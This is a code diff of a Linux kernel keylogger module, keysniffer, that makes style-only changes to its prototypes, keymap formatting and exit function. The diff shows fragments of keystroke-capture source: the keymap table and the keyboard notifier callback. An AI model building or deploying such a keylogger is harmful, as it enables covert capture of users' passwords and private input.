@@ -28,14 +28,16 @@ MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_DESCRIPTION("A kernel module to sniff and log the keys pressed in the system");
 
 /* Declarations */
-int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);
+static int keysniffer_cb(struct notifier_block *nblock,
+		unsigned long code,
+		void *_param);
 
 /* Definitions */
 
 /* Keymap references:
 https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 http://www.quadibloc.com/comp/scan.htm */
-static const char* us_keymap[][2] = {
+static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
 	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
 	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
@@ -73,7 +75,9 @@ static struct notifier_block keysniffer_blk = {
 };
 
 /* Keypress callback */
-int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param)
+int keysniffer_cb(struct notifier_block *nblock,
+		unsigned long code,
+		void *_param)
 {
 	struct keyboard_notifier_param *param = _param;
 	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%d, value: 0x%x\n",
@@ -100,7 +104,6 @@ static int __init keysniffer_init(void)
 static void __exit keysniffer_exit(void)
 {
 	unregister_keyboard_notifier(&keysniffer_blk);
-	return;
 }
 
 module_init(keysniffer_init);
